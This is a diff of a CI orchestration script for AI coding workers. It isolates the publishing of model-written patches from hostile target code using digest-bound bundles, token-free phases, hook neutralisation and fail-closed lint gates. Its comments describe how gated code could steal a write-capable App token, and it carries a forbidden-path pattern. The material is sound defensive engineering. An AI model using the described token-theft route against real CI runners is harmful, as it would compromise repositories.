+      printf 'worker-live: py_compile %s\n' "$name"
+      python3 -m py_compile "$name" || die "py_compile failed: $name"
+      direct=$((direct + 1))
     fi
   done
 
   # 2) The FULL recent-wave suite (regression backstop): every suite script present in the tree,
   #    run once. A touched script already ran above; running it twice is harmless + idempotent.
+  #    Suite runs count toward `ran` (coverage exists) but NOT toward `direct`: the suite validates
+  #    unrelated files, so it must never be what makes the gate non-vacuous.
   local script
   for script in $FULL_SELFTEST_SUITE; do
     [[ -f "scripts/$script" ]] || continue
@@ -673,26 +1133,51 @@ registry_selftest_gate() {
     if [[ "$kind" == bash ]]; then
       printf 'worker-live: bash -n %s\n' "$name"
       bash -n "$name" || die "bash -n failed: $name"
+      direct=$((direct + 1))
     fi
   done
 
-  # 4) actionlint + a yaml parse on every touched workflow.
+  # 4) yaml parse + actionlint on every touched workflow. [issue #140] actionlint is the SEMANTIC
+  #    linter; a yaml parse only proves the file is well-formed. Silently degrading to yaml-only when
+  #    actionlint was absent let a semantically-broken trust-plane workflow pass the gate. The worker
+  #    lane does not pre-install actionlint, so the gate provisions the pinned, sha256-verified
+  #    release itself (_ensure_actionlint — the same pin as pr-gate.yml) and FAILS CLOSED only when
+  #    neither a present nor a verifiably provisioned binary can be had.
+  local actionlint_bin=''
   for t in "${targets[@]}"; do
     kind=${t%%:*}; name=${t#*:}
     if [[ "$kind" == wf ]]; then
       printf 'worker-live: lint workflow %s\n' "$name"
       python3 -c 'import sys,yaml; yaml.safe_load(open(sys.argv[1]))' "$name" \
         || die "yaml parse failed: $name"
-      if command -v actionlint >/dev/null 2>&1; then
-        actionlint "$name" || die "actionlint failed: $name"
-      else
-        printf 'worker-live: actionlint not on PATH; yaml parse only for %s\n' "$name"
-      fi
+      [[ -n "$actionlint_bin" ]] || actionlint_bin=$(_ensure_actionlint) \
+        || die "actionlint unavailable and pinned provisioning failed: $name (fail closed — a workflow change cannot be under-validated)"
+      "$actionlint_bin" "$name" || die "actionlint failed: $name"
+      direct=$((direct + 1))
     fi
   done
 
+  # 5) [issue #145] every touched container definition must keep its base images digest-pinned so a
+  #    benign-labelled PR cannot silently weaken the model-isolation sandbox.
+  for t in "${targets[@]}"; do
+    kind=${t%%:*}; name=${t#*:}
+    if [[ "$kind" == dockerfile ]]; then
+      printf 'worker-live: base-image pin check %s\n' "$name"
+      _assert_dockerfile_pinned "$name" || die "container base image not digest-pinned: $name"
+      direct=$((direct + 1))
+    fi
+  done
+
+  # [issue #140] Non-vacuity is measured against the ACTUAL change: every touched control file
+  # (`targets`) must have been directly validated above. `ran` only proves the regression backstop
+  # ran; `direct == #targets` proves nothing touched slipped through unchecked (and flips closed if a
+  # future classification emits a target kind that no loop validates). A docs/data-only diff
+  # legitimately has no targets — the suite backstop (ran>0) still covers it.
   [[ "$ran" -gt 0 ]] || die 'registry-selftest gate ran no suite (fail closed — nothing validated)'
-  printf 'worker-live: registry-selftest gate passed (%s suite run(s))\n' "$ran"
+  [[ "$direct" -eq "${#targets[@]}" ]] \
+    || die "registry-selftest gate: a touched control file was not directly validated (fail closed): $direct/${#targets[@]}"
+  printf 'worker-live: registry-selftest gate passed (%s direct validation(s), %s suite run(s))\n' \
+    "$direct" "$ran"
 }
 
 # Model naming (maintainer directive 2026-07-18): sol is the codex-side FRONTIER model
@@ -701,6 +1186,7 @@ registry_selftest_gate() {
 # it labels WHOEVER authored a commit (docs lanes included) — it is not a review/fix chain.
 coauthor_for() {
   case "$1" in
+    opus5) printf '%s' 'Claude Opus 5 <noreply@anthropic.com>' ;;
     fable) printf '%s' 'Claude Fable 5 <noreply@anthropic.com>' ;;
     opus) printf '%s' 'Claude Opus 4.8 (1M context) <noreply@anthropic.com>' ;;
     sonnet) printf '%s' 'Claude Sonnet 4.6 <noreply@anthropic.com>' ;;
@@ -712,12 +1198,40 @@ coauthor_for() {
   esac
 }
 
-# Shared host-side commit + authenticated push (used by publish_pr and push_fix). The askpass
-# helper keeps the App token out of argv and the remote URL. Optional 4th/5th args (conflict-
-# repair path, fix kind=rebase): a .beads BASELINE ref — the merged default branch legitimately
-# carries .beads churn, so the tree must MATCH that ref there instead of being untouched — and a
-# 40-hex --force-with-lease guard (CAS push against the dispatched head; the merge commit itself
-# is a fast-forward, the lease only defends the race where someone pushed after dispatch).
+# Authenticated push, extracted so BOTH token-bearing callers share one askpass implementation
+# (`_git_commit_and_push` on the review-fix lane, `publish_pr` on the isolated publisher job of
+# issue #575). The askpass helper keeps the App token out of argv and out of the remote URL.
+_git_push_authenticated() {
+  local worker_root=$1 branch=$2 push_lease=${3:-}
+  [[ -n ${GH_TOKEN:-} ]] || die 'target-scoped App token is missing'
+  [[ -n "$worker_root" && "$worker_root" != / && -d "$worker_root" ]] || die 'WORKER_ROOT is unsafe'
+  [[ "$branch" =~ ^[A-Za-z0-9._/-]+$ ]] || die 'unsafe push branch'
+  [[ -z "$push_lease" || "$push_lease" =~ ^[0-9a-f]{40}$ ]] || die 'unsafe push lease sha'
+  local askpass="$worker_root/git-askpass.sh"
+  cat > "$askpass" <<'ASKPASS'
+#!/usr/bin/env bash
+case "$1" in
+  *Username*) printf '%s\n' 'x-access-token' ;;
+  *) printf '%s\n' "$GH_TOKEN" ;;
+esac
+ASKPASS
+  chmod 700 "$askpass"
+  local push_args=(push origin "HEAD:refs/heads/$branch")
+  [[ -z "$push_lease" ]] ||
+    push_args=(push "--force-with-lease=refs/heads/$branch:$push_lease" origin "HEAD:refs/heads/$branch")
+  GIT_ASKPASS="$askpass" GIT_TERMINAL_PROMPT=0 git "${push_args[@]}"
+}
+
+# Shared host-side commit + authenticated push (used by push_fix). The optional 4th/5th args
+# (conflict-repair path, fix kind=rebase): a .beads BASELINE ref — the merged default branch
+# legitimately carries .beads churn, so the tree must MATCH that ref there instead of being
+# untouched — and a 40-hex --force-with-lease guard (CAS push against the dispatched head; the
+# merge commit itself is a fast-forward, the lease only defends the race where someone pushed
+# after dispatch).
+#
+# NOTE (issue #575): the worker PUBLISH lane no longer routes through this helper. Its commit is
+# reconstructed on a separate, target-code-free publisher runner from a digest-bound patch, with
+# git hooks neutralised — see bundle_work()/publish_pr() below.
 _git_commit_and_push() {
   local branch=$1 message=$2 trailer=$3 beads_baseline_ref=${4:-} push_lease=${5:-}
   local worker_root=${WORKER_ROOT:-}
@@ -743,53 +1257,194 @@ _git_commit_and_push() {
   [[ -n "$(git diff --cached --name-only)" ]] || die 'no staged changes to publish'
   git commit -m "$message" -m "$trailer"
 
-  local askpass="$worker_root/git-askpass.sh"
-  cat > "$askpass" <<'ASKPASS'
-#!/usr/bin/env bash
-case "$1" in
-  *Username*) printf '%s\n' 'x-access-token' ;;
-  *) printf '%s\n' "$GH_TOKEN" ;;
-esac
-ASKPASS
-  chmod 700 "$askpass"
-  local push_args=(push origin "HEAD:refs/heads/$branch")
-  [[ -z "$push_lease" ]] ||
-    push_args=(push "--force-with-lease=refs/heads/$branch:$push_lease" origin "HEAD:refs/heads/$branch")
-  GIT_ASKPASS="$askpass" GIT_TERMINAL_PROMPT=0 git "${push_args[@]}"
+  _git_push_authenticated "$worker_root" "$branch" "$push_lease"
 }
 
-publish_pr() {
-  require_target
-  local issue_file=${WORKER_ISSUE_FILE:-}
-  local issue_number=${ISSUE_NUMBER:-}
-  local branch=${WORKER_BRANCH:-}
-  local default_branch=${TARGET_DEFAULT_BRANCH:-}
-  local bot_login=${TARGET_BOT_LOGIN:-}
-  local bot_id=${TARGET_BOT_ID:-}
-  local model_alias=${WORKER_MODEL_ALIAS:-}
-  local provider_model=${WORKER_PROVIDER_MODEL:-}
-  local agent=${WORKER_AGENT:-}
-  local gate=${GATE_PROFILE:-}
-  local worker_root=${WORKER_ROOT:-}
-  local target_repo=${TARGET_REPO:-}
-  local arm_requested=${ARM_AUTO_MERGE_REQUESTED:-false}
-  [[ -n ${GH_TOKEN:-} ]] || die 'target-scoped App token is missing'
-  [[ -f "$issue_file" && ! -L "$issue_file" ]] || die 'verified issue snapshot is missing'
-  [[ "$issue_number" =~ ^[1-9][0-9]*$ ]] || die 'unsafe issue number'
-  [[ "$branch" =~ ^[A-Za-z0-9._/-]+$ ]] || die 'unsafe worker branch'
-  safe_atom "$default_branch" || die 'unsafe target default branch'
-  [[ "$bot_id" =~ ^[0-9]+$ ]] || die 'unsafe target bot id'
-  [[ "$bot_login" =~ ^[A-Za-z0-9_.-]+\[bot\]$ ]] || die 'unsafe target bot login'
-  [[ "$target_repo" =~ ^[A-Za-z0-9_.-]+/[A-Za-z0-9_.-]+$ ]] || die 'unsafe target repo'
-  printf '::add-mask::%s\n' "$GH_TOKEN"
+# ---- issue #575: the model's work crosses the hostile/token boundary as INERT DATA --------------
+# The `worker` job runs the target's OWN gate (arbitrary target-controlled build scripts and tests)
+# on the runner. From that moment everything on that runner is attacker-writable: the sibling
+# `registry/` checkout (so the publisher SCRIPT itself), $GITHUB_ENV/$GITHUB_PATH, the target
+# worktree, `.git/hooks`, and any process the gate detaches. Publishing a token-bearing
+# commit/push/PR in that job therefore handed gated target code a contents/workflows/issues/PR
+# capable App token and an arbitrary post-gate publish surface.
+#
+# The publisher now lives in its own job on a FRESH runner that executes no target code and no
+# target-writable script. The only thing that crosses is a BUNDLE DIRECTORY of plain data:
+#
+#   patch.diff     unified `git diff --cached --binary` of the model's work against the base
+#   meta.json      target repo, base SHA, head branch, issue, model alias (host-derived)
+#   pr-title.txt   host-built Conventional-Commits title
+#   pr-body.md     host-built PR body
+#   followups.jsonl (optional) the model's declared out-of-scope work
+#
+# Nothing in it is executable and nothing in it is run: the publisher reconstructs the commit with
+# `git apply` onto a fresh checkout of the base, with git hooks neutralised. The bundle is sealed
+# PRE-GATE by `bundle_work` (which refuses to run with a token at all) and its digest is emitted as
+# a PRE-GATE STEP OUTPUT — captured by the runner before the hostile step starts, so no later step
+# can alter it. `verify_bundle` re-derives that digest from the downloaded artifact BEFORE the
+# publisher mints any token; every refusal skips publish, leaving pr_url empty so the always()
+# `final_state` job converges the issue to status:deferred.
 
-  local impl_provider=${WORKER_PROVIDER:-}
-  [[ "$impl_provider" == anthropic || "$impl_provider" == openai ]] ||
-    die 'unsafe implementation provider'
-  local pr_title_file="$worker_root/pr-title.txt"
-  local pr_body_file="$worker_root/pr-body.md"
-  python3 - "$issue_file" "$pr_title_file" "$pr_body_file" "$issue_number" "$agent" \
-    "$model_alias" "$provider_model" "$gate" "$arm_requested" "$impl_provider" <<'PY'
+# PURE (self-tested): print the sha256 manifest digest of a bundle DIRECTORY — sha256 over the
+# sorted `<sha256-of-content>  <relpath>` listing of every regular file below it. Contents, names
+# AND the file set are all bound: editing one byte, adding a file, dropping a file, or renaming one
+# flips the digest. A missing directory, a symlink, or any non-regular entry is a hard refusal
+# (fail closed) rather than a silently skipped entry.
+_bundle_digest() {
+  python3 - "$1" <<'PY'
+import hashlib
+import os
+import sys
+
+root = sys.argv[1]
+if os.path.islink(root) or not os.path.isdir(root):
+    sys.stderr.write("worker-live: bundle directory is missing or not a directory\n")
+    raise SystemExit(1)
+entries = []
+for dirpath, dirnames, filenames in os.walk(root):
+    for name in sorted(dirnames):
+        if os.path.islink(os.path.join(dirpath, name)):
+            sys.stderr.write("worker-live: bundle contains a symlinked directory\n")
+            raise SystemExit(1)
+    dirnames.sort()
+    for name in sorted(filenames):
+        full = os.path.join(dirpath, name)
+        rel = os.path.relpath(full, root).replace(os.sep, "/")
+        if os.path.islink(full) or not os.path.isfile(full):
+            sys.stderr.write("worker-live: bundle entry is not a regular file: %s\n" % rel)
+            raise SystemExit(1)
+        with open(full, "rb") as handle:
+            entries.append("%s  %s" % (hashlib.sha256(handle.read()).hexdigest(), rel))
+manifest = "".join(line + "\n" for line in sorted(entries)).encode("utf-8")
+print(hashlib.sha256(manifest).hexdigest())
+PY
+}
+
+# PURE (self-tested): total byte size of every regular file in a bundle directory.
+_bundle_total_bytes() {
+  python3 - "$1" <<'PY'
+import os
+import sys
+
+total = 0
+for dirpath, _dirnames, filenames in os.walk(sys.argv[1]):
+    for name in filenames:
+        total += os.path.getsize(os.path.join(dirpath, name))
+print(total)
+PY
+}
+
+# PURE (self-tested): prove a downloaded bundle is EXACTLY what the pre-gate step recorded.
+# Prints `ok` and exits 0, or prints `defer: <reason>` and exits 1. Every arm is a REFUSAL: a
+# missing/unreadable artifact, an oversized one, a digest mismatch, a target-repo/base-SHA/branch/
+# issue drift, an unusable patch, or a MISSING EXPECTATION (an empty pre-gate digest means the
+# recording step never ran, which is the missing-artifact case, not a free pass).
+_bundle_verify_verdict() {
+  local dir=$1 expect_digest=$2 expect_repo=$3 expect_base=$4 expect_branch=$5 expect_issue=$6 \
+    max_bytes=$7
+  local actual
+  if ! actual=$(_bundle_digest "$dir" 2>/dev/null); then
+    printf 'defer: bundle artifact is missing or unreadable\n'
+    return 1
+  fi
+  python3 - "$dir" "$actual" "$expect_digest" "$expect_repo" "$expect_base" "$expect_branch" \
+    "$expect_issue" "$max_bytes" <<'PY'
+import json
+import os
+import re
+import sys
+
+(root, actual_digest, expect_digest, expect_repo, expect_base, expect_branch, expect_issue,
+ max_bytes) = sys.argv[1:]
+
+
+def defer(reason):
+    print("defer: " + reason)
+    raise SystemExit(1)
+
+
+# The EXPECTATIONS come from the pre-gate step outputs + the workflow inputs. An empty or malformed
+# one is a refusal: an absent pre-gate recording cannot authorize a publish.
+if not re.fullmatch(r"[0-9a-f]{64}", expect_digest or ""):
+    defer("no pre-gate bundle digest was recorded (fail closed)")
+if not re.fullmatch(r"[0-9a-f]{40}", expect_base or ""):
+    defer("no pre-gate base SHA was recorded (fail closed)")
+if not re.fullmatch(r"[A-Za-z0-9_.-]+/[A-Za-z0-9_.-]+", expect_repo or ""):
+    defer("expected target repository is missing or unsafe")
+if not re.fullmatch(r"[A-Za-z0-9._/-]+", expect_branch or ""):
+    defer("expected head branch is missing or unsafe")
+if not re.fullmatch(r"[1-9][0-9]*", expect_issue or ""):
+    defer("expected issue number is missing or unsafe")
+
+for name in ("meta.json", "patch.diff", "pr-title.txt", "pr-body.md"):
+    path = os.path.join(root, name)
+    if os.path.islink(path) or not os.path.isfile(path):
+        defer("bundle artifact is missing %s" % name)
+
+try:
+    limit = int(max_bytes)
+except (TypeError, ValueError):
+    limit = 0
+if limit <= 0:
+    defer("bundle size limit is not configured (fail closed)")
+total = 0
+for dirpath, _dirnames, filenames in os.walk(root):
+    for name in filenames:
+        total += os.path.getsize(os.path.join(dirpath, name))
+if total > limit:
+    defer("bundle artifact is oversized (%d > %d bytes)" % (total, limit))
+
+if actual_digest != expect_digest:
+    defer("bundle digest mismatch — the artifact is NOT the pre-gate recording "
+          "(recorded %s…, downloaded %s…)" % (expect_digest[:12], actual_digest[:12]))
+
+try:
+    with open(os.path.join(root, "meta.json"), encoding="utf-8") as handle:
+        meta = json.load(handle)
+except (OSError, ValueError):
+    defer("bundle meta record is unreadable")
+if not isinstance(meta, dict) or meta.get("version") != 1:
+    defer("bundle meta record has an unsupported version")
+if meta.get("target_repo") != expect_repo:
+    defer("bundle target repository drift (%r)" % (meta.get("target_repo"),))
+if meta.get("base_sha") != expect_base:
+    defer("bundle base SHA drift (%r)" % (meta.get("base_sha"),))
+if meta.get("branch") != expect_branch:
+    defer("bundle head branch drift (%r)" % (meta.get("branch"),))
+if str(meta.get("issue")) != expect_issue:
+    defer("bundle issue drift (%r)" % (meta.get("issue"),))
+if not re.fullmatch(r"[A-Za-z0-9][A-Za-z0-9_.-]*", str(meta.get("model_alias") or "")):
+    defer("bundle model alias is missing or unsafe")
+
+# Patch shape + path safety. `git apply` refuses `.git` paths itself, but this is the LAST check
+# that runs before a token exists, so it refuses independently — and it refuses the QUOTED header
+# form (control/non-ASCII bytes) that the rest of the newline-framed pipeline cannot represent,
+# exactly as _porcelain_changed_paths refuses a newline in a changed path.
+try:
+    text = open(os.path.join(root, "patch.diff"), encoding="utf-8").read()
+except (OSError, UnicodeDecodeError):
+    defer("bundle patch is unreadable or is not valid UTF-8")
+headers = [line for line in text.splitlines() if line.startswith("diff --git ")]
+if not headers:
+    defer("bundle patch contains no diff (nothing to publish)")
+FORBIDDEN = re.compile(r"(?:^|[/ ])(?:\.\.|\.git|\.beads)(?:[/ ]|$)", re.IGNORECASE)
+for line in headers:
+    rest = line[len("diff --git "):]
+    if '"' in rest or "\\" in rest:
+        defer("bundle patch carries a quoted/escaped header path — refusing")
+    if FORBIDDEN.search(rest):
+        defer("bundle patch touches a forbidden path (.git/.beads/..) — refusing")
+
+print("ok")
+PY
+}
+
+# Builds the Conventional-Commits PR title + the DRAFT PR body from the host-verified issue
+# snapshot. Extracted from the old in-worker publish so it can run PRE-GATE, on the worker, with no
+# token: its output is sealed into the digest-bound bundle rather than being regenerated on the
+# publisher from state the gate could have touched.
+_write_pr_title_body() {
+  python3 - "$@" <<'PY'
 import json
 import re
 from pathlib import Path
@@ -861,21 +1516,209 @@ Path(body_file).write_text(body, encoding="utf-8")
 Path(title_file).chmod(0o600)
 Path(body_file).chmod(0o600)
 PY
+}
 
-  _git_commit_and_push "$branch" \
-    "feat: resolve target issue #$issue_number [$model_alias]" \
-    "Co-Authored-By: $(coauthor_for "$model_alias")"
+# PHASE 1 (worker job, PRE-GATE, NO TOKEN): seal the model's work as inert, digest-bound data.
+bundle_work() {
+  require_target
+  local issue_file=${WORKER_ISSUE_FILE:-}
+  local issue_number=${ISSUE_NUMBER:-}
+  local branch=${WORKER_BRANCH:-}
+  local default_branch=${TARGET_DEFAULT_BRANCH:-}
+  local model_alias=${WORKER_MODEL_ALIAS:-}
+  local provider_model=${WORKER_PROVIDER_MODEL:-}
+  local agent=${WORKER_AGENT:-}
+  local gate=${GATE_PROFILE:-}
+  local worker_root=${WORKER_ROOT:-}
+  local target_repo=${TARGET_REPO:-}
+  local arm_requested=${ARM_AUTO_MERGE_REQUESTED:-false}
+  local impl_provider=${WORKER_PROVIDER:-}
+  local max_bytes=${WORKER_BUNDLE_MAX_BYTES:-20971520}
 
-  local pr_url pr_number head_sha
+  # TOKEN-FREE BY CONSTRUCTION (AC1/AC4). This phase shares a runner with the hostile gate, so it
+  # must never be handed a write-capable token; a token in scope here means the workflow regressed.
+  [[ -z ${GH_TOKEN:-} ]] || die 'bundle phase must run with NO GitHub token'
+  [[ -f "$issue_file" && ! -L "$issue_file" ]] || die 'verified issue snapshot is missing'
+  [[ "$issue_number" =~ ^[1-9][0-9]*$ ]] || die 'unsafe issue number'
+  [[ "$branch" =~ ^[A-Za-z0-9._/-]+$ ]] || die 'unsafe worker branch'
+  safe_atom "$default_branch" || die 'unsafe target default branch'
+  [[ "$target_repo" =~ ^[A-Za-z0-9_.-]+/[A-Za-z0-9_.-]+$ ]] || die 'unsafe target repo'
+  [[ -n "$worker_root" && "$worker_root" != / ]] || die 'WORKER_ROOT is unsafe'
+  safe_atom "$model_alias" || die 'unsafe routed model alias'
+  [[ "$impl_provider" == anthropic || "$impl_provider" == openai ]] ||
+    die 'unsafe implementation provider'
+  [[ "$max_bytes" =~ ^[1-9][0-9]*$ ]] || die 'unsafe bundle size limit'
+
+  local base_sha
+  base_sha=$(git rev-parse HEAD)
+  [[ "$base_sha" =~ ^[0-9a-f]{40}$ ]] || die 'pre-gate base sha is unsafe'
+  # The same .beads refusal the in-worker publish applied, evaluated on the UNSTAGED tree so the
+  # shipped semantics are preserved byte for byte.
+  [[ -z "$(git status --porcelain=v1 -- .beads 2>/dev/null)" ]] || die 'refusing to publish .beads changes'
+
+  local bundle_dir="$worker_root/publish-bundle"
+  rm -rf -- "$bundle_dir"
+  mkdir -p "$bundle_dir"
+
+  # STAGE → SNAPSHOT → UNSTAGE. The index is restored to HEAD before returning so the gate that
+  # runs next sees EXACTLY the worktree the model left. This is load-bearing, not tidiness:
+  # run_gate's `git diff --check` and BOTH changed-path classifiers (crate-source detection and
+  # the registry-selftest target derivation) read `git diff`/`git status`, so a committed — or
+  # permanently staged — tree would empty them and turn the gate VACUOUS. That is also why the
+  # model's commit is reconstructed on the publisher instead of being made here.
+  git add -A -- .
+  git diff --cached --check
+  [[ -n "$(git diff --cached --name-only)" ]] || { git reset --quiet; die 'no staged changes to publish'; }
+  git diff --cached --binary > "$bundle_dir/patch.diff"
+  git reset --quiet
+  [[ -z "$(git diff --cached --name-only)" ]] || die 'bundle phase failed to restore the pre-gate index'
+
+  _write_pr_title_body "$issue_file" "$bundle_dir/pr-title.txt" "$bundle_dir/pr-body.md" \
+    "$issue_number" "$agent" "$model_alias" "$provider_model" "$gate" "$arm_requested" \
+    "$impl_provider"
+
+  # Model-declared follow-ups are UNTRUSTED model output. They cross inside the SAME digest-bound
+  # bundle so the publisher can only create the lines that existed before the gate ran.
+  if [[ -f "$worker_root/followups.jsonl" && ! -L "$worker_root/followups.jsonl" ]]; then
+    cp -- "$worker_root/followups.jsonl" "$bundle_dir/followups.jsonl"
+  fi
+
+  python3 - "$bundle_dir/meta.json" "$target_repo" "$base_sha" "$branch" "$issue_number" \
+    "$default_branch" "$model_alias" "$impl_provider" <<'PY'
+import json
+from pathlib import Path
+import sys
+
+(meta_path, target_repo, base_sha, branch, issue, default_branch, model_alias,
+ impl_provider) = sys.argv[1:]
+Path(meta_path).write_text(json.dumps({
+    "version": 1,
+    "target_repo": target_repo,
+    "base_sha": base_sha,
+    "branch": branch,
+    "issue": int(issue),
+    "default_branch": default_branch,
+    "model_alias": model_alias,
+    "impl_provider": impl_provider,
+}, indent=2, sort_keys=True) + "\n", encoding="utf-8")
+PY
+
+  local total digest
+  total=$(_bundle_total_bytes "$bundle_dir")
+  [[ "$total" -le "$max_bytes" ]] ||
+    die "publish bundle is oversized ($total > $max_bytes bytes)"
+  digest=$(_bundle_digest "$bundle_dir") || die 'publish bundle digest could not be computed'
+
+  write_output bundle_dir "$bundle_dir"
+  write_output bundle_digest "$digest"
+  write_output bundle_base_sha "$base_sha"
+  write_output bundle_branch "$branch"
+  write_output bundle_bytes "$total"
+  printf 'worker-live: sealed a %s-byte publish bundle (digest %s) BEFORE the hostile gate\n' \
+    "$total" "$digest"
+}
+
+# PHASE 2a (publisher job, BEFORE any token is minted): re-derive the digest from the downloaded
+# artifact and compare it against the PRE-GATE step outputs. A refusal here fails the step, every
+# later publisher step skips, pr_url stays empty, and the always() `final_state` job converges the
+# issue to status:deferred — never an unverified publish, never a token minted for one.
+verify_bundle() {
+  local bundle_dir=${WORKER_BUNDLE_DIR:-}
+  local expect_digest=${WORKER_BUNDLE_DIGEST:-}
+  local expect_repo=${TARGET_REPO:-}
+  local expect_base=${WORKER_BUNDLE_BASE_SHA:-}
+  local expect_branch=${WORKER_BUNDLE_BRANCH:-}
+  local expect_issue=${ISSUE_NUMBER:-}
+  local max_bytes=${WORKER_BUNDLE_MAX_BYTES:-20971520}
+  [[ -z ${GH_TOKEN:-} ]] || die 'bundle verification must run BEFORE any token is minted'
+  local verdict
+  if verdict=$(_bundle_verify_verdict "$bundle_dir" "$expect_digest" "$expect_repo" \
+      "$expect_base" "$expect_branch" "$expect_issue" "$max_bytes"); then
+    write_output verified true
+    printf 'worker-live: publish bundle verified against the pre-gate record (%s)\n' "$verdict"
+    return 0
+  fi
+  write_output verified false
+  die "publish bundle REFUSED — $verdict (skipping publish; final_state converges to status:deferred)"
+}
+
+# PHASE 2b (publisher job, WITH the token): reconstruct the commit from the verified patch on a
+# fresh checkout of the pre-gate base, push it, and open the DRAFT PR. TARGET_DIR here is the
+# PUBLISHER's own checkout — no target code has ever run on this runner, and nothing in the bundle
+# is executed: `git apply` only, with hooks neutralised (never `git am --exec`, never a script).
+publish_pr() {
+  require_target
+  local bundle_dir=${WORKER_BUNDLE_DIR:-}
+  local expect_digest=${WORKER_BUNDLE_DIGEST:-}
+  local expect_base=${WORKER_BUNDLE_BASE_SHA:-}
+  local branch=${WORKER_BUNDLE_BRANCH:-}
+  local issue_number=${ISSUE_NUMBER:-}
+  local target_repo=${TARGET_REPO:-}
+  local default_branch=${TARGET_DEFAULT_BRANCH:-}
+  local bot_login=${TARGET_BOT_LOGIN:-}
+  local bot_id=${TARGET_BOT_ID:-}
+  local worker_root=${WORKER_ROOT:-}
+  local max_bytes=${WORKER_BUNDLE_MAX_BYTES:-20971520}
+
+  [[ -n ${GH_TOKEN:-} ]] || die 'target-scoped App token is missing'
+  printf '::add-mask::%s\n' "$GH_TOKEN"
+  [[ "$issue_number" =~ ^[1-9][0-9]*$ ]] || die 'unsafe issue number'
+  [[ "$target_repo" =~ ^[A-Za-z0-9_.-]+/[A-Za-z0-9_.-]+$ ]] || die 'unsafe target repo'
+  safe_atom "$default_branch" || die 'unsafe target default branch'
+  [[ "$bot_id" =~ ^[0-9]+$ ]] || die 'unsafe target bot id'
+  [[ "$bot_login" =~ ^[A-Za-z0-9_.-]+\[bot\]$ ]] || die 'unsafe target bot login'
+  [[ -n "$worker_root" && "$worker_root" != / && -d "$worker_root" ]] || die 'WORKER_ROOT is unsafe'
+
+  # RE-VERIFY (defence in depth). The dedicated pre-mint step already refused a drifted bundle;
+  # repeating the identical verdict here means a future reordering of the publisher's steps cannot
+  # silently let unverified content through.
+  local verdict
+  verdict=$(_bundle_verify_verdict "$bundle_dir" "$expect_digest" "$target_repo" \
+    "$expect_base" "$branch" "$issue_number" "$max_bytes") ||
+    die "publish bundle REFUSED at push time — $verdict"
+
+  [[ "$(git rev-parse HEAD)" == "$expect_base" ]] ||
+    die 'publisher checkout is not at the pre-gate base SHA'
+
+  local model_alias
+  model_alias=$(python3 -c 'import json,sys; print(json.load(open(sys.argv[1]))["model_alias"])' \
+    "$bundle_dir/meta.json")
+  safe_atom "$model_alias" || die 'unsafe model alias in the verified bundle'
+
+  git config user.name "$bot_login"
+  git config user.email "$bot_id+$bot_login@users.noreply.github.com"
+  # HOOKS NEUTRALISED (AC2/AC7). The publisher never runs anything the target ships: core.hooksPath
+  # is redirected for the whole checkout, repeated command-scoped on the commit, and --no-verify is
+  # passed as well. Any one of the three is sufficient; all three are cheap.
+  git config core.hooksPath /dev/null
+  git switch -c "$branch"
+  git -c core.hooksPath=/dev/null apply --binary --index --whitespace=nowarn -- \
+    "$bundle_dir/patch.diff" ||
+    die 'digest-verified patch did not apply cleanly to the pre-gate base'
+  [[ -z "$(git status --porcelain=v1 -- .beads 2>/dev/null)" ]] || die 'refusing to publish .beads changes'
+  git diff --cached --check
+  [[ -n "$(git diff --cached --name-only)" ]] || die 'reconstructed patch staged no changes'
+  git -c core.hooksPath=/dev/null commit --no-verify \
+    -m "feat: resolve target issue #$issue_number [$model_alias]" \
+    -m "Co-Authored-By: $(coauthor_for "$model_alias")"
+
+  local pr_url pr_number head_sha title
   head_sha=$(git rev-parse HEAD)
-  [[ "$head_sha" =~ ^[0-9a-f]{40}$ ]] || die 'pushed head sha is unsafe'
+  [[ "$head_sha" =~ ^[0-9a-f]{40}$ ]] || die 'reconstructed head sha is unsafe'
+  [[ "$(git rev-parse HEAD^)" == "$expect_base" ]] ||
+    die 'reconstructed commit is not rooted at the pre-gate base'
+
+  _git_push_authenticated "$worker_root" "$branch"
+
+  title=$(<"$bundle_dir/pr-title.txt")
+  [[ -n "$title" && "$title" != *$'\n'* ]] || die 'publish bundle carries an unsafe PR title'
   pr_url=$(gh pr create \
     --repo "$target_repo" \
     --base "$default_branch" \
     --head "$branch" \
     --draft \
-    --title "$(<"$pr_title_file")" \
-    --body-file "$pr_body_file")
+    --title "$title" \
+    --body-file "$bundle_dir/pr-body.md")
   [[ "$pr_url" =~ ^https://github.com/[^/]+/[^/]+/pull/[0-9]+$ ]] || die 'PR creation returned no URL'
   pr_number=${pr_url##*/}
   [[ "$pr_number" =~ ^[0-9]+$ ]] || die 'PR number could not be derived from the URL'
@@ -956,6 +1799,69 @@ Path(prompt_path).chmod(0o600)
 PY
 }
 
+# Capture the reviewer-produced (and fixer-consumed) verdict outside the target tree.  The model
+# is instructed to respect worker-pr.py's 2000-character summary cap, but a useful review must not
+# be voided solely because its prose ran long.  Normalize that one producer-side field before the
+# unchanged fail-closed validator sees it.  Python string slicing uses the same character counting
+# as worker-pr.py's len(summary), so multi-byte UTF-8 is never cut at a byte boundary.
+_capture_review_verdict() {
+  local source=$1 destination=$2
+  mv -f -- "$source" "$destination"
+  chmod 600 "$destination"
+  python3 - "$destination" <<'PY'
+import json
+import os
+from pathlib import Path
+import sys
+import tempfile
+
+path = Path(sys.argv[1])
+with path.open(encoding="utf-8") as handle:
+    document = json.load(handle)
+
+summary = document.get("summary") if isinstance(document, dict) else None
+if not isinstance(summary, str):
+    print("worker-live: reviewer/fixer summary original length: non-string "
+          "(preserved for fail-closed validation)")
+    raise SystemExit(0)
+
+limit = 2000
+original_length = len(summary)
+print(f"worker-live: reviewer/fixer summary original length: {original_length} characters")
+if original_length <= limit:
+    raise SystemExit(0)
+
+# The removed count is part of the marker, and its digit count affects how much source text fits.
+# Iterate to the stable prefix length, then assert the same cap the validator enforces.
+keep = limit
+while True:
+    removed = original_length - keep
+    marker = f"… [truncated {removed} chars]"
+    next_keep = limit - len(marker)
+    if next_keep == keep:
+        break
+    keep = next_keep
+summary = summary[:keep] + marker
+assert len(summary) == limit
+document["summary"] = summary
+
+temporary = None
+try:
+    with tempfile.NamedTemporaryFile(
+            mode="w", encoding="utf-8", dir=path.parent,
+            prefix=f".{path.name}.", delete=False) as handle:
+        temporary = Path(handle.name)
+        json.dump(document, handle, ensure_ascii=False, separators=(",", ":"))
+        handle.write("\n")
+    os.chmod(temporary, 0o600)
+    os.replace(temporary, path)
+finally:
+    if temporary is not None:
+        temporary.unlink(missing_ok=True)
+print(f"worker-live: reviewer/fixer summary truncated to {limit} characters")
+PY
+}
+
 run_review() {
   require_target
   local worker_root=${WORKER_ROOT:-}
